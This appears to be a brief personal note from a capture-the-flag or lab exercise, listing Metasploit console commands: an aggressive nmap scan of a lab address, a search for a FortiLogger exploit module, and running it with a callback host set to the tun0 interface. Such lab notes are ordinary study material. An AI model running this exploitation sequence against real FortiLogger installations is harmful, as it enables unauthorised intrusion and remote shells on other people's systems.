[[nmap]]
```shell
sudo msfdb

db_nmap -A -T5 10.129.62.196
search FortiLogger

use 0

set rhosts <ip>
set lhost tun0
run
```

